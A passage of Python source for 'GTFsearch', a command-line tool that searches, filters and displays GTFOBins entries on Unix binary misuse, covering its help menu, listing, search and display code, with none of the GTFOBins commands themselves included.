        history_file = str(Path.home() / '.gtfsearch_history')
        
        return PromptSession(
            completer=completer,
            key_bindings=kb,
            style=CONFIG['PROMPT_STYLE'],
            message=get_prompt,
            validate_while_typing=False,
            multiline=False,
            erase_when_done=True,
            history=FileHistory(history_file),
            complete_while_typing=True,
            complete_style='multi_column'
        )

    def _clear_screen_only(self):
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')

    def _clear_screen(self):
        self._clear_screen_only()
        self._show_help()

    def _show_help(self):
        total_width = 60
        title = " HELP - GTFsearch "
        side_width = (total_width - len(title)) // 2
        self.console.print(f"[blue bold]╓{'─' * side_width}╢[/blue bold][white bold]{title}[/white bold][blue bold]╟{'─' * side_width}╖[/blue bold]\n")

        self.console.print(f"  [green]{'Command'.ljust(20)}[/green][green]{'Alias'.ljust(8)}[/green][green]{'Description'.ljust(32)}[/green]")
        self.console.print(f"  {'─' * 20}{'─' * 8}{'─' * 32}")
        commands = [
            ("help", "h", "Show this help menu"),
            ("list binaries", "lb", "List binaries"),
            ("exit", "q", "Return to searchCommand"),
        ]
        for cmd, alias, desc in commands:
            self.console.print(f"  [green]➜ [/green]{cmd.ljust(19)}[grey]{alias.ljust(7)}[/grey][white]{desc.ljust(32)}[/white]")

        self.console.print("")
        self.console.print(f"  [green]{'Shortcut'.ljust(20)}[/green][green]{'Description'.ljust(32)}[/green]")
        self.console.print(f"  {'─' * 20}{'─' * 8}{'─' * 32}")
        shortcuts = [
            ("Ctrl + L", "Clear the screen and show help"),
            ("Ctrl + C", "Show exit message"),
            ("Ctrl + K", "List binaries quickly"),
        ]
        for shortcut, desc in shortcuts:
            self.console.print(f"  [green]• [/green]{shortcut.ljust(18)}[white]{desc.ljust(32)}[/white]")

        self.console.print(f"\n[blue bold]╙{'─' * (2 * side_width + len(title) + 1)}╜[/blue bold]\n")

    def _list_commands(self):
        if not self.gtfobins_data:
            self.console.print("\n[red]No results found[/red]\n")
            return

        self._clear_screen_only()
        filtered_data = self.gtfobins_data
        if self.function_filter:
            filtered_data = [tool for tool in self.gtfobins_data if any(f.get('function', '').strip().lower() == self.function_filter for f in tool.get('functions', []))]
        #self.console.print()

        table = Table(
            show_header=True,
            header_style="bold white on #23242f",
            border_style="dim #23242f",
            show_lines=True,
            padding=(0, 1),
            expand=False,
            row_styles=["", "on #23242f"],
            box=box.HEAVY
        )

        table.add_column("BINARY", style="#fe013a", no_wrap=False, justify="left", min_width=20)
        table.add_column("AVAILABLE FUNCTIONS", style="#fe013a", no_wrap=False)

        for i, tool in enumerate(sorted(filtered_data, key=lambda x: x.get('name', ''))) :
            if 'name' not in tool or 'functions' not in tool:
                continue

            binary_name = tool['name']
            functions = tool.get('functions', [])
            function_names = sorted(set(
                f.get('function', '').strip() for f in functions if f.get('function', '').strip() and f.get('function', '').strip().lower() != 'info'
            ))
            functions_str = ", ".join(function_names) if function_names else "No functions"
            row_style = "bold" if i % 2 == 0 else ""
            table.add_row(binary_name, functions_str, style=row_style)

        self.console.print(table)
        self.console.print()

    def _handle_internal_command(self, query: str) -> Optional[bool]:
        query = query.lower().strip()
        
        if len(query) > 100:
            self.console.print("[red][-] Command too long[/red]")
            return None
        
        if query in ['help', 'h']:
            self._clear_screen_only()
            self._show_help()
            return True
        elif query in ['list binaries', 'lt', 'lb']:
            self._clear_screen_only()
            self._list_commands()
            return True
        elif query in ['exit', 'q']:
            return False
        
        return None

    def _search_gtfobins_secure(self, query: str) -> List[Dict]:
        query = query.lower().strip()
        
        if len(query) < 2:
            return []

        entry = self.gtfobins_index.get(query)  
        if not entry:
            return []

        results = []
        result_count = 0
        max_results = CONFIG['MAX_RESULTS']
        
        functions = entry.get("functions", [])
        if self.function_filter:
            functions = [f for f in functions if f.get('function', '').strip().lower() == self.function_filter]
        for function in functions:
            if result_count >= max_results:
                break
            
            function_name = function.get("function", "")
            function_desc = function.get("description", "")
            examples = function.get('examples', [])
            if examples:
                for example in examples:
                    if result_count >= max_results:
                        break
                    
                    results.append({
                        "binary": entry.get("name", ""),
                        "function": function_name,
                        "function_desc": function_desc,
                        "example": example
                    })
                    result_count += 1
            else:
                if function_desc.strip():
                    results.append({
                        "binary": entry.get("name", ""),
                        "function": function_name,
                        "function_desc": function_desc,
                        "example": {}
                    })
                    result_count += 1
        
        return results

    def _display_results(self, results: List[Dict]):
        self._clear_screen_only()
        
        if not results:
            self.console.print(f"\n[red]No results found[/red]\n")
            return
        
        results = results[:50]
        
        results_by_binary = {}
        for result in results:
            binary = result["binary"]
            if binary not in results_by_binary:
                results_by_binary[binary] = []
            results_by_binary[binary].append(result)
        
        for binary_idx, (binary, binary_results) in enumerate(results_by_binary.items()):
            self.console.print(f"\n[bold #fe013a]▌[/bold #fe013a]FILTERED BINARY:[bold #6e6e6e] {binary.upper()}[/bold #6e6e6e]\n")
            
            functions = sorted(set(result["function"].strip() for result in binary_results if result["function"].strip() and result["function"].strip().lower() != 'info'), key=len)
            if functions:
                function_display = ""
                for i, func in enumerate(functions):
                    if i > 0:
                        function_display += " "
                    function_display += f"[dim #666666]•[/dim #666666] "
                    function_display += f"[bold #fe013a]{func}[/bold #fe013a]"
                
                self.console.print(f"[bold red]▌[/bold red][underline]AVAILABLE FUNCTIONS[/underline]:{function_display}")
            
            functions_by_type = {}
            for result in binary_results:
                func_type = result["function"]
                if func_type not in functions_by_type:
                    functions_by_type[func_type] = []
                functions_by_type[func_type].append(result)
            
            for func_idx, (function, func_results) in enumerate(functions_by_type.items()):
                if func_idx > 0:
                    self.console.print()
                
                self.console.print()
                if function and function.lower() != "info":
                    self.console.print(f"[bright_red]▌ [/bright_red][bold white]{function.upper()}[/bold white] [bold red]#[/bold red]\n")
                
                if func_results[0].get("function_desc"):
                    desc_text = func_results[0]["function_desc"].rstrip()
                    desc_parts = desc_text.split('\n\n')
                    for i, part in enumerate(desc_parts):
                        if part.strip():
                            formatted_part = part
                            styled_part = self._style_text_with_highlights(formatted_part, base_style="white")
                            padded_part = Padding(styled_part, (0, 0, 0, 2))
                            self.console.print(padded_part)
                            if i < len(desc_parts) - 1:
                                self.console.print()
                
                if func_results[0].get("function_desc") and len(func_results) > 0:
                    self.console.print()
                
                if len(func_results) > 0:
                    label_counter = 0
                    for example_idx, result in enumerate(func_results):
                        example = result["example"]
                        
                        has_sub_or_su = "sub_description" in example or "su_description" in example
                        has_description = "description" in example or has_sub_or_su
                        if not has_sub_or_su and len(func_results) > 1 and has_description:
                            label_text = Text(f"({chr(97 + label_counter)})", style="bold white")
                            label_counter += 1
                        else:
                            label_text = Text()
                        
                        label_printed = False
                        first = True
                        previous_key = None
                        for key, value in example.items():
                            if function and function.lower() == "info":
                                if not first:
                                    if not (previous_key in ["sub_description", "su_description"] and key == "code"):
                                        self.console.print()
                                first = False
                                if key == "description":
                                    desc = value.rstrip()
                                    if desc:
                                        styled_desc = Text()
                                        if len(func_results) > 1 and not label_printed and has_description:
                                            styled_desc.append(label_text)
                                            styled_desc.append(" ")
                                            label_printed = True
                                        formatted_part = desc
                                        highlighted_part = self._style_text_with_highlights(formatted_part, base_style="white")
                                        styled_desc.append(highlighted_part)
                                        padded_example = Padding(styled_desc, (0, 0, 0, 2))
                                        self.console.print(padded_example)
                                elif key in ["sub_description", "su_description"]:
                                    desc = value.rstrip()
                                    if desc:
                                        styled_desc = Text()
                                        if len(func_results) > 1 and not label_printed and not has_sub_or_su and has_description:
                                            styled_desc.append(label_text)
                                            styled_desc.append(" ")
                                            label_printed = True
                                        formatted_part = desc
                                        highlighted_part = self._style_text_with_highlights(formatted_part, base_style="white")
                                        styled_desc.append(highlighted_part)
                                        padded_example = Padding(styled_desc, (0, 0, 0, 2))
                                        self.console.print(padded_example)
                                elif key == "code":
                                    code = value
                                    if code:
                                        if len(func_results) > 1 and not label_printed and has_description:
                                            padded_label = Padding(label_text, (0, 0, 0, 2))
                                            self.console.print(padded_label)
                                            label_printed = True
                                        code_text = Text(code, style="#f74949")
                                        code_panel = Panel(
                                            code_text,
                                            style="on #3a0000",
                                            padding=(0, 2, 0, 2),
                                            border_style="#3a0000"
                                        )
                                        padded_code = Padding(code_panel, (0, 0, 0, 2))
                                        self.console.print(padded_code)
                            else:
                                if not first:
                                    if not (previous_key in ["sub_description", "su_description"] and key == "code"):
                                        self.console.print()
                                first = False
                                if key == "description":
                                    desc = value.rstrip()
                                    if desc:
                                        styled_desc = Text()
                                        if len(func_results) > 1 and not label_printed and has_description:
                                            styled_desc.append(label_text)
                                            styled_desc.append(" ")
                                            label_printed = True
                                        formatted_part = desc
                                        highlighted_part = self._style_text_with_highlights(formatted_part, base_style="white")
                                        styled_desc.append(highlighted_part)
                                        padded_example = Padding(styled_desc, (0, 0, 0, 2))
                                        self.console.print(padded_example)
                                elif key in ["sub_description", "su_description"]:
                                    desc = value.rstrip()
                                    desc = re.sub(r'\n+', '\n', desc)
                                    if desc:
                                        styled_desc = Text()
                                        if len(func_results) > 1 and not label_printed and not has_sub_or_su and has_description:
                                            styled_desc.append(label_text)
                                            styled_desc.append(" ")
                                            label_printed = True
                                        formatted_part = desc
                                        highlighted_part = self._style_text_with_highlights(formatted_part, base_style="white")
                                        styled_desc.append(highlighted_part)
                                        padded_example = Padding(styled_desc, (0, 0, 0, 2))
                                        self.console.print(padded_example)
                                elif key == "code":
                                    code = value
                                    if code:
                                        if len(func_results) > 1 and not label_printed and has_description:
                                            padded_label = Padding(label_text, (0, 0, 0, 2))
                                            self.console.print(padded_label)
                                            if not example.get("description") and not example.get("sub_description") and not example.get("su_description"):
                                                self.console.print()
                                            label_printed = True
                                        code_text = Text(code, style="#f74949")
                                        code_panel = Panel(
                                            code_text,
                                            style="on #3a0000",
                                            padding=(0, 2, 0, 2),
                                            border_style="#3a0000"
                                        )
                                        padded_code = Padding(code_panel, (0, 0, 0, 2))
                                        self.console.print(padded_code)
                            previous_key = key
                        
                        if example_idx < len(func_results) - 1:
                            self.console.print() 
        
        self.console.print()
        terminal_width = self.console.size.width
        final_separator = "━" * (terminal_width - 4)
        self.console.print(f"[dim #23242f]  {final_separator}[/dim #23242f]")
        self.console.print()

    def _format_text_with_wrap(self, text: str, max_line_length: int = 90) -> str:
        if not text:
            return ""
        
        lines = text.split('\n')
        formatted_lines = []
        
        for line in lines:
            line = line.strip()
            if not line:
                formatted_lines.append("")
                continue
            
            if len(line) <= max_line_length:
                formatted_lines.append(line)
            else:
                words = line.split()
                current_line = []
                current_length = 0
                
                for word in words:
                    if current_length + len(word) + 1 <= max_line_length:
                        current_line.append(word)
                        current_length += len(word) + 1
                    else:
                        if current_line:
                            formatted_lines.append(' '.join(current_line))
                        current_line = [word]
                        current_length = len(word)
                
                if current_line:
                    formatted_lines.append(' '.join(current_line))
        
        return '\n'.join(formatted_lines)

    def _style_text_with_highlights(self, text: str, base_style: str = "white") -> Text:
        if not text:
            return Text()

        # Collect highlight intervals
        highlight_matches = []
        for pattern in CONFIG['HIGHLIGHT_PATTERNS']:
            for match in re.finditer(pattern, text):
                highlight_matches.append((match.start(), match.end()))

        highlight_matches.sort(key=lambda x: x[0])
        merged_highlight = []
        for start, end in highlight_matches:
            if not merged_highlight or merged_highlight[-1][1] < start:
                merged_highlight.append([start, end])
            else:
                merged_highlight[-1][1] = max(merged_highlight[-1][1], end)

        # Collect no_color intervals
        no_color_matches = []
        for pattern in CONFIG['NO_COLOR_PATTERNS']:
            for match in re.finditer(pattern, text):
                no_color_matches.append((match.start(), match.end()))

        no_color_matches.sort(key=lambda x: x[0])
        merged_no_color = []
        for start, end in no_color_matches:
            if not merged_no_color or merged_no_color[-1][1] < start:
                merged_no_color.append([start, end])
            else:
                merged_no_color[-1][1] = max(merged_no_color[-1][1], end)

        # Collect all unique points
        points = {0, len(text)}
        for intervals in [merged_highlight, merged_no_color]:
            for s, e in intervals:
                points.add(s)
                points.add(e)

        points = sorted(points)

        styled_text = Text()
        for i in range(len(points) - 1):
            start = points[i]
            end = points[i + 1]
            if start == end:
                continue
            seg = text[start:end]

            is_no_color = any(s <= start < e for s, e in merged_no_color)
            is_highlight = any(s <= start < e for s, e in merged_highlight)

            if is_no_color:
                style = base_style
            elif is_highlight:
                style = CONFIG['HIGHLIGHT_STYLE']
            else:
                style = base_style

            styled_text.append(seg, style=style)

        return styled_text

    def run(self):
        self._clear_screen()
        
        while True:
            try:
                query = self.prompt_session.prompt()
                
                if not query or not query.strip():
                    self._clear_screen()
                    self.last_command_success = False
                    self.console.print("[bright_blue][ℹ][/bright_blue] Enter a search term or 'exit' to return.\n")
                    continue
                
                query_clean = query.strip().lower()
                if query_clean.startswith('['):
                    query_clean = query_clean.split(']')[-1].strip()
                
                if len(query_clean) > 100:
                    self._clear_screen()
                    self.last_command_success = False
                    self.console.print("[red][-][/red] Search too long.\n")
                    continue
                
                command_result = self._handle_internal_command(query_clean)
                if command_result is False:
                    if self.from_search_command:
                        self.console.print("[green][✔][/green] Returning to searchCommand mode...\n")
                    else:
                        self.console.print(Text("\t\t\tH4PPY H4CK1NG!", style="bold red"))
                    break
                elif command_result is True:
                    self.last_command_success = True
                elif len(query_clean.strip()) < 2:
                    self._clear_screen()
                    self.last_command_success = False
                    self.console.print("[red bold][-][/red bold] Search must have at least 2 characters.\n")
                else:
                    results = self._search_gtfobins_secure(query_clean)
                    self._display_results(results)
                    self.last_command_success = bool(results)
                    if not results:
                        self._clear_screen()
                        self.console.print(f"[red bold][-][/red bold] No results found for [grey]{query_clean}[/grey].\n")
                
            except KeyboardInterrupt:
                self._clear_screen_only()  
                self.console.print(f"\n[orange1][!] Use 'exit' or 'q' to exit properly.[/orange1]")
                continue
            except Exception as e:
                self.console.print(f"[red][-] Unexpected error: {str(e)[:100]}[/red]")
                self.last_command_success = False
                continue
        
        return "exit_gtfsearch"

# ------------------------ MAIN FUNCTION ------------------------ #

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Search GTFOBins information for a command, optionally filtered by type (e.g., SUID), or list all commands",
        add_help=False,
        usage="gtfsearch [-h] [-l] [-t TYPE] [command]"
    )
    parser.add_argument("-h", "--help", action="help", help="Show this help message")
    parser.add_argument("-l", "--list", action="store_true", help="List all available commands")
    parser.add_argument("-t", "--type", help="Filter by function type (e.g., SUID)")
    parser.add_argument("command", nargs="?", help="Command to search (e.g., nmap)")
    
    args = parser.parse_args()

    gtf = GTFSearch(function_filter=args.type)

    if args.list or (args.type and not args.command):
        gtf._list_commands()
        sys.exit(0)
    elif args.command:
        results = gtf._search_gtfobins_secure(args.command)
        gtf._display_results(results)
        sys.exit(0)
    else:
        gtf.run()

if __name__ == "__main__":
    main()